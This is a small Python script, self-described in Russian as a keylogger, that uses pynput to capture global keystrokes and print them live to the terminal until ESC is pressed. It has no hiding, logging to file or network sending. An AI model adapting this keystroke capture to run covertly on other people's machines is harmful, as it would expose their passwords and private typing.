"""
Логгер клавиш. Показывает что нажимаешь в реальном времени.
Запуск: python keylogger.py
Выход: Ctrl+C в терминале
"""

from pynput import keyboard


def on_press(key):
    try:
        print(f"[+] {key.char}", end="", flush=True)
    except AttributeError:
        print(f" [{key}] ", end="", flush=True)


def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[!] Выход")
        return False


if __name__ == "__main__":
    print("Кейлоггер запущен. Жми клавиши. ESC — выход.\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
